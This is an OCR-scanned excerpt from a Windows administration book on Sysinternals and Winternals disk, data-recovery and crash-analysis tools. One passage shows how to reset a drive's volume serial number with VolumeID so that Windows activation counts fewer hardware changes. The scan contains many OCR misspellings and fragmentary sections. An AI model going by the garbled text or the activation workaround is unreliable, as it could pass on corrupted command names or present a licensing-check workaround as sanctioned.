Parent 
Id 
Disk Id 
Start 
Size 
: Diskl- 01 
: 0x040A 
: 0x0408 
: 0x0403 
: 0x0 
: 0x3FDC41 
(2043 MB) 
Volume 
Off: 
0x0 
(0 MB) 
The Database Records are also known as the VBLK database. The total number 
of VBLKs present in the LDM database is recorded in the VMDB Database Header. 
Record types can be any one of the following: DiskGroup, Volume, Component, 
Partition, or Disk. Only one DiskGroup record will be in the database. 
Each record in the database has its own naming convention. For example, dif- 
ferent disks are named Diskl, Disk2, Disk3, and so on; partitions on disk X are 
named DiskX-01, DiskX-02, and so on, and simple, spanned, and mirrored volumes 
are named Volume 1, Volume2, and so on. 
A DiskGroup record stores the name of the disk group; a 64-byte volume- 
unique identifier known as Objectld; and the GUID. In the example shown in Code 
Listing 5.15, the name of the disk group is VmboxDgO. A Disk record stores the 
name of the disk, the Objectld, and the GUID of a specific disk.Apart from its 
name, Objectld, and GUID, a Volume record contains the volume status, size, and 
drive letter. Similarly, a partition record stores the information related to a partition 
in the disk. 

268 
Chapter 5 9 Disk Management 
Examining the Relationship 
Between Volume, Component, and Partition Records 
A Component entry acts as a connector between a volume and a partition.You may 
be wondering why this information is needed. Since you know that a volume can 
occupy multiple partitions on multiple disks, by using a Component record, you can 
track all the partitions belonging to a volume. From the previous example, you can 
see that the partition record has a Parent Id that is identical to the Object Id of the 
Volume1-01 Component record. In turn, this Component record's Parent Id is iden- 
tical to the Object Id of the Volume1 volume record. If a volume spans over mul- 
tiple partitions, all partitions of this volume will have a Parent Id equal to the Object 
Id of the component of the volume. 
Managing Volume IDs 
During a clean install, or whenever a volume is formatted, Windows assigns a 32-bit 
number to that volume, known as the Volume Serial Number (VSN) or VolumelD. 
The VSN is stored in the first sector of the partition. Windows uses the VSN to 
identify volumes uniquely.You can easily obtain a volume's VSN by using the vol 
command at the command prompt, or even a simple dir command. 
The VSN is displayed in the form of a 4-byte hexadecimal number with the 
format xxxx-zzzz, where xxxx is the higher-order word and zzzz is the lower- 
order word. The VSN is actually a function of the time and date when the drive was 
formatted.You calculate the lower-order word (zzzz) by adding the hexadecimal 
value of the month and day to the hexadecimal values of the seconds and 100th of a 
second.You calculate the higher-order word (xxxx) by adding the hexadecimal value 
of hours and minutes along with the hexadecimal value of the year. To illustrate this, 
consider an example in which the drive is formatted on July 1, 2006, at 01:00 EM. 
and 30.60 seconds. The serial number is calculated as follows: 
Lower-order word: 
Month and day 
07/01 0701 
Seconds and 100th of seconds 30:60 
1E3C 
Sum 
253D 
Higher-order word: 
Hours and minutes 
13:00 
0D00 
Year 
2006 
07D6 
Sum 
14D6 

Disk Management 9 Chapter 5 
269 
By combining the higher- and lower-order words, you get the VSN, which in 
this example is 14D6-253D. In Windows, there is no built-in tool to change the 
VSN. Once Windows stamps the VSN on a drive, it is changed only when the drive 
is reformatted or when the file system is converted to NTFS from the FAT file 
system. However, it sometimes becomes necessary to change a volume's VSN; in 
these situations, you can use the VolumeID tool from Sysinternals. This command- 
line tool allows you to assign an}, VSN to a volume. Here is the syntax of the 
VolumeID tool: 
VolumeID.exe 
<drive 
letter 
:> xxxx-xxxx 
Here is the command to change the VSN of volume C in a system, to the one 
calculated in our example: 
VolumeID.exe 
C: 14D6-253D 
You might be wondering in what situations you would need to change a volume's 
VSN. To understand the importance of VSNs, you need to learn a bit about 
Microsoft's Windows Product Activation (WPA) feature. WPA is a methodology Microsoft 
uses to prevent the installation of the same copy of Windows on different systems. 
During installation, Windows' WPA system checks 10 categories of hardware ranging 
from network interface cards to hard drives. A drive's VSN is also one of these 10 cate- 
gories. The WPA system records information about these categories of hardware in 
numerical format. When activating Windows, this number is sent to Microsoft. In sub- 
sequent boot-ups, Windows checks these 10 categories of hardware to make sure the 
system is still the same. The WPA system treats the system as different if it finds more 
than seven changes out of 10 hardware categories. When you perform a clean install, 
the drives are formatted, and hence, their VSN changes too. After installation, Windows 
needs to be reactivated again. Windows again checks the 10 categories and calculates a 
number, which is sent to Microsoft during activation. If more than seven hardware 
changes have taken place since reinstallation, Windows treats it as a different machine 
and this needs to be explained to Microsoft. Maybe you need to call Microsoft to 
explain that the system is really the same! In any event, you can restore a change in the 
VSN after reinstallation by using the VolumeID tool. Let's see how to do this. 
Before reformatting, run the vol command from the command prompt and note 
the VSN of the drive that is going to be formatted. After formatting and installing 
Windows, and before activating it, run VolumeID and change the new VSN of the 
formatted drive to the original one that you recorded previously. If this procedure 
brings down the hardware changes to fewer than seven, the machine is treated as 
though it has not changed and activation is done automatically. 

270 
Chapter 5 9 Disk Management 
Managing Disk 
Utilization (Du, DiskView) 
For system administrators, keeping disk utilization in check is a common task. The 
ever-increasing popularity of media files, games, and other disk-space-craving appli- 
cations poses a threat to efficient use of disk space. To examine disk use on a 
Windows computer, Microsoft offers some built-in features, including the Disk 
Management MMC snap-in and even Windows Explorer, to examine the size of a 
file, folder, or volume. However, not all of these features provide an easy way to get 
comprehensive information about disk use, such as the space used by a specific 
directory or file. In this section, I will discuss some tools from Sysinternals that you 
can use to obtain extensive information regarding disk use. 

Disk Management 9 Chapter 5 
271 
An Easier Way to Find Large Directories 
Sysinternals' Du, which stands for disk usage, is a command-line tool that you can use 
to obtain information concerning a directory's disk-space usage easily and quickly. 
When you run it from the command prompt without any command-line argu- 
ments, you receive output describing the arguments that are available in Du. Code 
Listing 5.16 shows some sample Du output: 
Code Listing 5.16 Options Available in Du 
Du vl.3 - report directory disk usage 
Copyright (C) 2005-2006 Mark Russinovich 
Sysinternals - www.sysinternals.com 
usage: du [ [-v] [-I <levels>] 
I [-n]] 
[-q] <directory> 
-i 
Specify subdirectory depth of information (default is all levels). 
-n 
Do not recurse. 
-q 
Quiet (no banner). 
-v 
Show size (in KB) of intermediate directories. 
As you use Du to determine the size of a directory, one question that comes to 
mind is whether the tool should display the size of all the subdirectories inside the 
specified directory, or only the size of the specified directory.You control this condi- 
tion by providing the level of depth, along with the argument,-l. If you do not 
specify -l, Du will display the size of aH the subdirectories, along with the specified 
directory. An opposite alternative to that of-/is -n, which stands for Do not recurse. 
When you supply-n as an argument, Du does not mention individual subdirectory 
sizes in its output. Another argument,- v, instructs Du to show the size of each 
directory found within the specified directory. On the contrary, if you do not use-v, 
the output shows only the size of the specified directory. 
www.syngress.com 

272 
Chapter 5 9 Disk Management 
Finding Space Utilized 
by User Documents and Applications 
Say you want to determine the disk space used by the users of a file server or other 
computer. Using Du, it is very easy to get this information. Since documents related 
to users are generally stored in their respective directories inside the Documents and 
Settings directory, you can use Du to scan each user's folder and report the disk 
space. Here is the command to use: 
Du.exe -i 1 "X:\Documents and Settings" > UserSpace.txt 
Here, you are providing 1 for the argument -I because you just want to find out 
the size of the directories that are directly underneath the Documents and Settings 
folder~that is, to a depth of level 1. X:\ in this case indicates the drive letter. By 
redirecting the Du output to a text file, it becomes easier to study disk use. 
Sometimes you might wonder what applications are taking up large amounts of 
space in a volume. Using Du, you can quickly find out which application is eating 
up space. Let's consider an example where the applications are installed in the 
Program Files directory. Therefore, the command to determine the space used by 
each application would look like this: 
Du.exe -i 1 "X:\Program Files" > AppSpace.txt 
Here, once again, the logic is the same as the command used to view the space 
occupied by user documents. 
Note that the code snippets given here are for demonstration purposes only. 
Hence, it is necessary to replace suitable directory paths where actual user files reside 
or applications are installed. 
Viewing Where Files Are Located on a Disk 
Suppose there is a large file on a disk and you need to know where it is actually 
located, as well as its fragmentation status. In these circumstances, you can use the 
DiskView tool. 
You have seen that by double-clicking on any area in the DiskView map, you 
can see information about the file that's occupying a particular cluster. Now we are 
going to do the reverse! We will provide a file, and DiskView will highlight the clus- 
ters occupied by that file. Clicking the ... (ellipsis) button located next to the 
Highlight text box will open the Open dialog box. After choosing the required file, 
DiskView highlights in yellow the clusters occupied by this file. By double-clicking 
on any of these clusters, you can get the cluster properties as discussed in the pre- 
vious section (see Figure 5.3). 
www.syngress.com 

Disk Management 9 Chapter 5 
273 
DiskView also can create a log file that contains information about all the files 
present in a specified volume. Click the Export button and provide a filename, and 
DiskView will generate the log. This log contains three elements: 
Fragments The first entry in the log indicates the number of fragments 
into which the file is divided. 
Total Clusters The second entry indicates the total number of clusters 
the file occupies. 
Filename The final entry indicates the name of the file, along with its 
path. 
Viewing NTFS Metadata Files from DiskView 
You have seen NTFSInfo's limitation of being unable to display metadata files in sys- 
tems using NTFS5. However, DiskView overcomes this drawback and enables you 
to determine the actual location of metadata files.You may be wondering how to 
locate hidden metadata files in DiskView. It is quite easy; just type the name of the 
metadata file in the Highlight text box, prefixed by the drive letter of the currently 
selected volume in DiskView, and press the Enter key. For example, to locate the 
metadata file $Mft, you type C:\$mft in the Highlight text box and then press the 
Enter key. DiskView will highlight the clusters occupied by SMft. As usual, double- 
clicking in any part of this selected area will bring up the Cluster Properties 
dialog box, giving information about the cluster occupied by the metadata file. 
Figure 5.22 shows the cluster properties of SMft. 

274 
Chapter 5 9 Disk Management 
Figure 5.22 Cluster Properties of $Mft Shown by DiskView 
For a list of some general metadata files, please refer to the section "Getting 
Extended NTFS Information" earlier in this chapter. 
Continued 

Disk Management 9 Chapter 5 
275 
p,~ 
www.syngress.com 

276 
Chapter 5 9 Disk Management 
Summary 
In this chapter, you learned many aspects of disk management, starting from how 
fragmentation occurs to the internals of partitioning schemes available in Windows. 
Often people think that command-line tools are arcane and difficult to use in com- 
parison with trendy, GUI-based software. On reading this chapter, you hopefully 
have learned that the disk management command-line tools from Sysinternals can be 
quite informative and easy to use. 
Numerous self-explanatory examples consisting of commands, their corre- 
sponding on-screen output, and their meanings will bring you close to the core of 
several concepts in disk management. This chapter explained the functionalities of 
the following software: 
9 PageDeffag, to deal effectively with the operating-system-locked, special 
files 
9 
Contig, to analyze and deffagment a selective group of files, or individual 
files 
9 DiskView, which presents the hard disk in the form of a color-coded map 
depicting the actual locations of files on disk 
9 DiskExt, to analyze and understand the extensions of volumes over multiple 
partitions in multiple disks 
9 
NTFSInfo, to visualize the internals of NTFS file system structures 
9 LDMDump, to understand the concepts of the Logical Disk Manager parti- 
tioning scheme 
9 Du, to determine the size of a specific directory, up to its intended depth 
9 VolumeID, to play with the Volume Serial Numbers of volumes 
The chapter also demonstrated some innovative ways in which you can use these 
tools. 

Disk Management 9 Chapter 5 
277 
Solutions Fast Track 
Managing Disk Fragmentation (Defrag 
Manager, PageDefrag, Contig, DiskView) 
Vr You can use PageDefrag to &flag special locked files, such as pagefiles, 
hibernation files, and system Registry hives. 
I-4I To defrag a specific file or a set of files, use Contig. By creating batch files, 
you can automate the defragment process. 
Vr To defragment frequently accessed files at system startup, create a batch file 
and place it in the Startup folder. 
I-4I With the help of a graphical map of volumes generated by DiskView, you 
can locate fragmented files and then use Contig to deffagment them. 
!-4I Use the -n switch in Contig to create optimized files of the required size. 
Getting Extended File/Disk Information 
(DiskExt, DiskView, NTFSInfo, LDMDump) 
Easily find disk extensions of all volumes in a system, by using DiskExt 
without any arguments. 
I-4I Use NTFSInfo to determine the bytes per sector, bytes per cluster, total 
sectors, and clusters in a volume. 
Use LDMDump to learn more about partition layout and volume 
definitions. 
Disk Volume Management 
(NTFSInfo, VolumeID, LDMDump) 
I-4I Use NTFSInfo to view advanced NTFS information, such as MFT size, the 
MFT Zone, and cluster offsets. 
I-4I NTFSInfo does not show metadata files on systems that use NTFS5. In this 
case, use DiskView instead. 


Disk Management 
9 Chapter 5 
279 
A" PageDefrag requires administrator privileges to run. Hence, starting PageDefrag 
from a user account that has fewer privileges creates the aforementioned error. 
By using the runas command available in Windows systems, you can execute 
these tools with administrator credentials from the less-privileged user accounts. 
The syntax of the runas command is: 
runas /user :UserAccountName program 
For example, to run PageDefrag with administrator privileges, with the 
assumption that PageDeffag is located in the C:\Tools directory, use this com- 
mand: 
runas /user:Administrator C:\Tools\PageDefrag.exe 
When this command is executed, the user is prompted for the administrator 
password. 
Q" Which tools require administrator privileges to run? 
A" Contig, DiskExt, LDMDump, NTFSInfo, PageDefrag, and VolumelD require 
administrator privileges. Only Du can work in less-privileged user accounts. 
Q" Why do I get "Access is denied" errors messages for pagefile.sys and hiberfil.sys, 
when DiskView is used to examine a volume? 
A" This error comes up only for the volume where these two files are located. 
These files are used by the operating system and are locked so that other appli- 
cations cannot access them. Hence, when DiskView tries to access these locked 
files, it generates the "Access is denied" error. 
Q: The LDMDump log shows "* * * Unknown type: X" in its output. Why does 
this happen? 
A: "* * * Unknown type: X" means the volume with the drive letter X is missing 
from the system. This occurs when the disk containing the volume is disabled in 
the Device Manager. The Disk Management MMC snap-in shows disabled disks 
as "Offline." 
Q" Can I run these tools from a bootable CD? 
A" You can run these tools from a Preinstalled Environment CD such as BartPE, 
WinPE or E1KD Commander with the help of freely available third-party 
plug-ins. 


282 
Chapter 6 9 Recovering Lost Data 
Introduction 
All system administrators have found themselves in a position where, just as they 
were confirming the deletion of a file, they realized that it was the wrong file. The 
first method of"undoing" these deletions was born with the introduction of the 
Recycle Bin. Unfortunately, the Recycle Bin does not capture files that you delete 
programmatically or via a command prompt. Furthermore, you cannot recover files 
or folders after you've emptied the Recycle Bin. It is also possible to lose data while 
using drive partition tools, or at least to have difficulty finding the data. The process 
of retrieving these files is data recouery, and a host of tools is available to us to per- 
form such duties. 
In this chapter, we will examine the data recovery tools made available to us by 
the Winternals team, and discuss how to use them effectively. From recovering files 
lost on the local computer, to recovering data from a damaged disk located across a 
network, a tool in this toolset will serve that purpose. We will also take a close look 
at the more advanced solutions available that can recover data from multiple nodes 
via a centralized console, and how to recover Active Directory objects that have been 
inadvertently deleted. 
Recovering Data Across 
a Network (Remote Recover) 
No matter how many e-mail reminders you send to your user base about not saving 
important files to a local hard drive, there will always be that one person who thinks 
that this does not apply to them. That same person will also be the first one who 
calls and needs help to save his or her day and recover a critical file that he or she 
saved on only his or her local drive. With the assistance of the Remote Recover 
tool, it is possible for you to be the hero and save the file. 
You can also use Remote Recover to repair corrupt or missing driver files.A 
bad video or controller card driver can create a very unstable or unbootable system. 
By using this tool to recover the problematic driver file, you can avoid the process of 
having to reload or reimage the computer, giving you time to work on other issues. 
Remote Data Recovery 
Remote Recover lets you access another computer's hard drive over a network as 
though it were installed locally on your computer.Your options available for booting 
the target system include CD-1KOM (using ERD Commander or another tool), 
floppy disk, or PXE boot (PXE is the capability to boot from the computer's net- 

Recovering Lost Data 9 Chapter 6 
283 
work card and then load the operating system over the network from a server). 
Once the target system is connected to the host and the drives are mounted, you 
can run tools from your local system, such as antivirus and antispyware software, 
against the target or even remotely install an operating system. 
Remote Disk Recovery 
Now that you are connected to the remote system and it is showing up as a local 
drive, you are ready to begin using your tools on the drive, as shown in Figure 6.1. 
Figure 6.1 Remote Recover Console 

284 
Chapter 6 9 Recovering Lost Data 
You can see the remote drive connected here and mapped as the local E: drive. 
From here you can defragment the drive, edit the Registry, add, remove, replace, 
or copy files, and so on. As far as the host computer is concerned, it looks like and is 
treated like any other local drive. 
Recovering Files (FileRestore) 
Simple, fast, and clean, FileRestore works with the whole family of Windows sys- 
tems, from Windows 95 through Windows 2003.You use it to recover deleted files 
from File Allocation Table (FAT) and FAT32 file systems, as well as from NT file 
systems (NTFS). FileRestore does not require that the files have passed through the 
recycle system; it will recover files that have not yet been overwritten, even if 
another user deleted them, as long as you have administrator rights. 
The File Restoration Process 
If you have ever searched for a regular file on your system with Windows Explorer, 
you will find the job of searching for deleted files very easy. That is because of 
Windows Explorer's user-friendly interface, and with FileRestore, the team at 
Winternals has done a remarkable job of making us feel at home.You can search 
through drives and directories using the familiar choices listed here, and shown in 
Figure 6.2: 
9 Search for files by name or extension. 
9 Search based on the last time a file was modified. 
9 Search based on the file size. 

Recovering Lost Data 9 Chapter 6 
285 
Figure 6.2 Searching for Deleted Files with FileRestore 
After you enter your search criteria, click the Search Now button. 
As you can see, FileRestore determines the possible condition of the recover- 
ability of each file and lists it in the Recoverability field. Likely and Unlikely give us 
an initial indication of the condition of the file. Likely indicates the file has not been 
overwritten; however, it does not guarantee that the file does not contain corrupt 
data. Additionally, you can see that when a file is listed as Unlikely, it gives an intact 
cluster count. This may be beneficial; if nothing else, you may be able to recover part 
of the data in the file. 
Recovering the Files 
Once you have entered your search criteria and retrieved a list of possible matches, 
you can select and restore the entire list or lust the individual files you want to 
recover. Right-clicking and selecting Copy to Folder, or the Copy selected file 
to folder button, accomplishes this. Then simply browse to the folder into which 
you want to restore the file or files (see Figure 6.3). 

286 
Chapter 6 9 Recovering Lost Data 
Figure 6.3 Recovering Files with FileRestore 
If FileRestore has completely recovered the file(s) you are looking for, you 
should be able to open them with their normal associated program. However, if 
FileRestore only partially recovered the files, you may need to use a tool such as 
WinHex (see Figure 6.4) and carve out the recoverable portion of data in the files. 
Figure 6.4 Examining File Contents with WinHex 

Recovering Lost Data 9 Chapter 6 
287 
In this test file, you can recover everything except the section of text missing. If 
this was a 100-page document and you could recover 99 pages of the text, you may 
find these results to be very acceptable. 
Another option is to copy the file list from FileRestore to the Clipboard for 
export to another document. To do this, select the Copy file list to Clipboard 
button and paste the list into any type of document that can accept pastes from the 
Clipboard. 
Recovering Data with NTRecover 
Although NTRecover is one of the older tools covered in this chapter, it still can be 
a viable tool for recovering data. In the event of a system crash or other incident, 
you might not always be able to rely on network connectivity and will need another 
solution. All you need in order to use NTRecover are a boot floppy and a serial 
cable connected to another computer.You can even reset a local account's password 
using the Locksmith application. 
Local File Restoration 
What are you to do when you have a system that just will not boot up cleanly, even 
after you have exhausted many options? You tried booting to safe mode and/or the 
last known good configuration, with the same results: a nonworking computer. With 
your next plan of action to format the drive and reinstall the operating system, you 
need to preserve your personal files, settings, and programs. 
Caveats and Pitfalls 
There are always risks when performing data recovery, and the potential to be either 
the hero or the bearer of bad news. As with all critical data, an ounce of prevention 
goes a long way in maintaining data availability. 

288 
Chapter 6 9 Recovering Lost Data 
Advanced Data Recovery and 
Centralized Recovery (Recovery Manager) 
So, we have discussed some isolated solutions that work well in small environments 
or on a case-by-case basis. For a larger enterprise environment, you need a more 
robust solution. Perhaps you need something with a centralized point of administra- 
tion, as well as the option to schedule backups and recover data across hundreds, 
thousands, or even more systems. 
Setup and Management 
As part of the install process, one of the prerequisites is Microsoft Data Access 
Components (MDAC) Version 2.8 or later. If MDAC is not already on the system, 
you will need to install it, and a reboot will be required. One of the next require- 
ments is the database backend, which can be either Microsoft SQL Server 2000 or 
Microsoft SQL Server 2000 Desktop Edition (MSDE). If you don't have either 
option already available, you can install MSDE locally as an additional step of the 
install. 
The rest of the setup and configuration consists of scheduling and creating 
recovery sets. Winternals provides wizards for creating schedules and has some precon- 
figured recovery sets that include the following: 
9 
System This protects system files, system settings, and boot files. 
9 
Program Files This protects files in the Program Folders directory and in 
all its subdirectories. 
9 User Settings This protects the user's Registry settings. 
9 User Data This protects data in the Documents and Settings folder and in 
all subdirectories. 
9 Bare Metal This protects disk information including Master Boot Record 
(MBR.) and volume information as well as the Logical Disk Manager 
(LDM) database (dynamic disks). 
9 All Files This backs up all files on all volumes, including Registry hives. 
Recovery Points 
Once you are done with the initial installation of lKecovery Manager, the new 
schedule wizard will guide you through the steps of scheduling recovery points. The 
www.syngress.com 

Recovering Lost Data 9 Chapter 6 
289 
following screenshots show some of the steps and the process for creating recovery 
points. 
The wizard takes you through each step of the process.You will end up with a 
process in place to back up data on a regular basis. 
First, you create the naming convention and describe the schedule.You also 
select the time at which to create recovery points. This also is where you define the 
user credentials. A common practice for this situation is to create a dedicated 
account with the appropriate privileges needed to aid in auditing (see Figure 6.5). 
Figure 6.5 Schedule Settings 
In the next step, you decide whether this account is for a client that is perma- 
nently connected to the network and will store the data centrally on a server, or 
whether it is for a mobile client that will store the data locally for use in an offline 
restore (see Figure 6.6). 

290 
Chapter 6 9 Recovering Lost Data 
Figure 6.6 Schedule Mode for Storage and Network Options 
Next, you select what information you want to protect with your scheduled 
recovery set. The items shown in Figure 6.7 are default recovery sets.Your selections 
here will depend on whether you are recovering data on a server, a desktop, or a 
laptop. 
Figure 6.7 Recovery Sets 

Recovering Lost Data 9 Chapter 6 
291 
Next, you decide what local options to install, if any. From here, you can auto- 
matically push down the agent or use an alternate method to deploy, depending on 
the environment.You can also install the boot client as an additional option in the 
boot screen to allow for an easier recovery process and not require a boot disk or 
CD-ROM (see Figure 6.8). 
Figure 6.8 Client Deployment Settings 
After completing the client deployment settings, you'll be ready to set up the 
Recovery Center. Figure 6.9 shows the many options available from the Recovery 
Center's main screen. 
www.syngress.com 

292 
Chapter 6 9 Recovering Lost Data 
Figure 6.9 Recovery Center 
Precision Repair 
With Recovery Manager, you can perform a precision repair for when you know 
the specific cause of the problem and just want to replace a few files.You can use 
this same process to reset local machine account passwords, including the local 
Administrator account. While other free tools are available for recovering the local 
Administrator password, they require physical access to the workstation, whereas 
Recovery Manager can do this over the network. 
System Rollback 
Another option for recovery is a system rollback that restores the system to its state 
on a specified date and time when a backup occurred. This can be a lifesaver in the 
event of a bad patch deployment, spyware, or other malware infection, or in the rare 
case that an end user accidentally modified the system and rendered it nonfunc- 
tional. If the system is a remote client, the recovery data is stored locally and can be 
accessed off the network. If you need to verify or audit the results, upon completion 
a change report document is created in HTML format. 

Recovering Lost Data 9 Chapter 6 
293 
Restoring Lost Active 
Directory Data (AdRestore) 
It's that time again, and your internal audit department team is coming around with 
their lists and asking all sorts of questions to which they may not really understand 
the answers.You were asked to provide a list of active user accounts and it has been 
determined that some of those accounts need to be disabled. As you are working on 
the list of accounts, you decide it is better to delete the accounts completely. 
The next day the internal auditor is in your office and wants to see that those 
accounts are now disabled. What are your options for proving to the auditor that the 
accounts are disabled, but still exist? ! will cover the options for this in the material 
ahead. 
Restoration Methodologies 
Domain administrators like to think they know everything and never make mistakes. 
Fortunately, Microsoft was kind enough to add the capability to recover deleted or 
tombstoned objects from Active Directory. 

294 
Chapter 6 9 Recovering Lost Data 
How Ad Restore Works 
AdRestore is the result of Windows 2003 allowing you to recover tombstoned files 
within Active Directory. It first has to enumerate the objects that have been tomb- 
stoned and then it provides a list of objects that are available to be restored. If you 
want to restore a particular object, you can run the program with the additional 
syntax for which to search. 
The typical syntax is simply adrestore-r and this prompts you for the objects to 
restore (see Figure 6.10). If you change the syntax to adrestore-r administrator, it will 
look for objects named administrator. Included are some examples of the output you 
should see when using AdRestore. 
Figure 6.10 The AdRestore Command Prompt 

Recovering Lost Data 9 Chapter 6 
295 
Summary 
At this point, you have many tools under your belt that you can use to recover data 
in a wide range of situations that could arise. This includes everything from a legacy 
NT4-based system that needs help getting booted, a failing drive that is on the other 
side of the globe but can look like any other local drive, and even a managed solu- 
tion that can be put in place to prevent a crisis and minimize the impact of a poten- 
tial data-loss scenario. 
It's never a good time to lose information, and although you know that ideally, 
you should have a proper backup plan in place, that is not always the case. By being 
prepared, you can provide a better service to your users during a time when many 
other administrators might fail or have only a partial solution. 
Solutions Fast Track 
Recovering Data Across 
a Network (Remote Recover) 
1---4I When you use Remote Recover, no remote client is needed since you can 
boot from CD, floppy, or PXE. 
Remote Recover enables you to use any local tools on the remote drive. 
V--el Remote Recover allows full access over your current Internet Protocol (IP) 
network. 
Recovering Files (FileRestore) 
gl 
gl 
One of the keys to recovering files is not overwriting them; therefore, it is 
highly recommended that you keep FileRestore installed on your system, 
especially on important systems such as file servers. 
FileRestore does not depend on the files having passed through the recycle 
system; it will recover files that have not yet been overwritten. 
You can enter multiple wildcard characters in the box labeled Search for 
files named; simply separate them with a semicolon. 


Recovering Lost Data 9 Chapter 6 
297 
Q" When is a precision repair the best option? 
A" A precision repair is the best option when you have determined the root cause 
or have resolved an issue in the past and know an exact fix. 
Q- Why would I want to roll back a computer? 
A: You would want to roll back a computer if it was the victim of a virus or other 
malicious attack.You also might want to perform this task if a patch or update 
went wrong. 
Q: What options do I have as far as the database backend for Recovery Manager? 
A: Recovery Manager supports either a Microsoft SQL Server 2000 database or an 
MSDE database. 
Q" What options can I provide to end users in Remote Manager? 
A" You can give clients permission to create restore points and/or the ability to roll 
back to recovery points. 
Q" What types of objects can I restore in Active Directory? 
A: You can restore any type of object within Active Directory, as long as you have 
restored everything at a higher level first. 
Q" Why is it even possible to recover items when they are supposed to be deleted? 
A: Since Active Directory is a database, items are tombstoned and still exist for any- 
where from 60 to 180 days, depending on your installation; you just can't see 
them in the management console view. 
www.syngress.com 


300 
Chapter 7 9 System Troubleshooting 
Introduction 
Perhaps the most common task that any system administrator performs is finding 
and correcting problems in a computer. Sometimes these issues are easy to identify 
and other times they are not. Luckily, the Windows operating system provides a set 
of tools that can assist administrators. However, these tools lack some of the 
advanced functionality required to troubleshoot some of the most intricate issues. 
In this chapter, you will learn how to make sense of the infamous Blue Screen 
of Death (BSOD).You will also discover how to identify conflicts in settings and 
access permissions, as well as detect issues with loaded drivers and running processes. 
You will also learn how to detect and correct issues with Active Directory. 
Making Sense of a Windows 
Crash (Crash Analyzer Wizard) 
The dreaded Blue Screen of Death, or BSOD, used to be much more common than 
it is today. With Microsoft Windows 98 and Windows NT 4.0, the BSOD was virtu- 
ally a daily occurrence for some users. With Windows 2000 and later versions, the 
operating system is much more stable and the BSOD is a much rarer event. 
BSODs do still occur, though. For many people, the BSOD is a screen of mean- 
ingless gibberish on a blue background that immediately precedes a system reboot. 
Nevertheless, that gibberish, and the information extracted from memory and saved 
in the resulting dump file, holds the clues to help you identify what caused the 
system crash so that you can resolve the problem ... if you know what you are 
looking for. 
One way to turn the gibberish into something meaningful is to use the Crash 
Analyzer Wizard tool from Winternals. The Crash Analyzer Wizard is part of the 
Winternals Administrator's Pak, which contains a variety of very useful tools for 
computer technicians and system administrators. 
Running the Crash Analyzer Wizard 
Unlike some of the other Winternals utilities that you can run as is directly from a 
command line, the Administrator's Pak and its tools, including the Crash Analyzer 
Wizard, must be installed before they can be used. The Crash Analyzer Wizard also 
requires additional software in order to perform its functions. 
www.syngress.com 

System Troubleshooting ~ Chapter 7 
301 
Crash Analyzer Wizard Prerequisites 
The Crash Analyzer Wizard relies on the Microsoft Debugging Tools to perform the 
underlying grunt work. It is up to the user to acquire and install the current version 
of Microsoft Debugging Tools before running the Crash Analyzer Wizard. 
Internet Access 
In order to operate, the Crash Analyzer Wizard requires access to the Internet. It 
does not record or report information back to Winternals, nor does it communicate 
any confidential information. The Internet access is required primarily so that the 
Crash Analyzer Wizard can access the necessary symbols from the Microsoft 
Symbols Server. 
Drive Format 
As you might guess from the Microsoft-centric nature of the Winternals 
Administrator's Pak and the Crash Analyzer Wizard, the program will work only on 
drives using native Microsoft formats. The Crash Analyzer Wizard requires write 
access to a drive using either NT file system (NTFS) or File Allocation Table (FAT) 
file system formatting. 
Microsoft Debugging Tools 
While you are installing the Crash Analyzer Wizard, you must specify the directory 
where the Microsoft Debugging Tools are installed.You can get the current version 
for your system from the Debugging Tools for Windows site 
(www.microsoft.com/whdc/devtools/debugging/default.mspx), or you can click on 
the link provided during the installation process. 
Using the Crash Analyzer Wizard 
Once you have installed the Winternals Administrator's Pak, troubleshooting a system 
crash is a straightforward task. After your computer reboots following the BSOD, 
start the Crash Analyzer Wizard by clicking on Start ] All Programs [ 
Winternals Administrator's Pak I Crash Analyzer Wizard. 

302 
Chapter 7 9 System Troubleshooting 
Initially you will see the Welcome to the Crash Analyzer Wizard window. From 
this window you can select whether to manually or automatically choose the loca- 
tions of the files necessary to run the program (see Figure 7.1). The window has 
only one checkbox. By checking the box, you configure the Crash Analyzer Wizard 
to run an analysis of the most recent crash dump file, using the default locations for 
finding the Microsoft Debugging Tools and the symbol files. If you wish to specify 
different locations or run an analysis of a crash dump other than the most recent 
one, you should uncheck this box. 
Figure 7.1 The Crash Analyzer Wizard Welcome Window 
When you click Next, the Crash Analyzer Wizard will analyze the results of the 
most recent crash dump file and provide an Analysis Summary screen with basic 

System Troubleshooting 9 Chapter 7 
303 
information about the crash dump file that was analyzed and the results, pointing to 
the most likely cause of the crash screen (see Figure 7.2). The Analysis Summary 
screen provides details about the filename and location of the crash dump file that 
was analyzed and offers the results of the analysis, naming the driver determined 
most likely to be the cause of the system crash. Near the bottom right of the screen 
is a button marked Details, which you can click on to access the Analysis Details 
screen, where you can learn more about the faulty driver and the crash analysis. 
Figure 7.2 The Analysis Summary Screen 
The Analysis Details screen has three tabs. Click on the first tab, marked Crash 
Message, to view more details about the actual crash. A code is recorded in the 
crash dump file to indicate the cause of the crash. The Crash Message tab displays 
the crash code and provides a brief explanation of what the crash code means, and it 
provides the recommended actions for you to take. 
The second tab, Loaded Drivers, shows you all of the drivers that were loaded 
at the time of the crash, possibly providing clues to what may have conflicted and 
resulted in the crash. Reviewing the list of loaded drivers may help you determine a 
course of action for removing the driver that crashed the system. 

304 
Chapter 7 9 System Troubleshooting 
If you want to dig deeper, click on the Advanced tab. Here you will find the 
complete, verbose output generated by the Crash Analyzer Wizard analysis (see Code 
Listing 7.1). If the results of the analysis do not yield definitive results, or the driver 
identified does not appear to be the cause of the crash, look at the detailed informa- 
tion in the Advanced tab to sift through the analysis and hunt for clues. 
Code Listing 7.1 Crash Analyzer Wizard's Output 
Microsoft (R) Windows Debugger 
Version 6.6.0003.5 
Copyright (c) Microsoft Corporation. All rights reserved. 
Loading Dump File [c : \windows\memory. dmp] 
Kernel Summary Dump File: Only kernel address space is available 
Symbol search path is: 
srv*c:\symbols*http://msdl.microsoft.com/download/symbols 
Executable search path is: 
Windows XP Kernel Version 2600 (Service Pack 2) UP Free x86 compatible 
Product: WinNt, suite: TerminalServer SingleUserTS 
Built by: 2600.xpsp_sp2_gdr.050301-1519 
Kernel base = 0x804d7000 PsLoadedModuleList = 0x8055a420 
Debug session time: Tue May 
2 15:28:15.568 2006 (GMT-4) 
System Uptime: 0 days 0:01:54.234 
Loading Kernel Symbols 
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
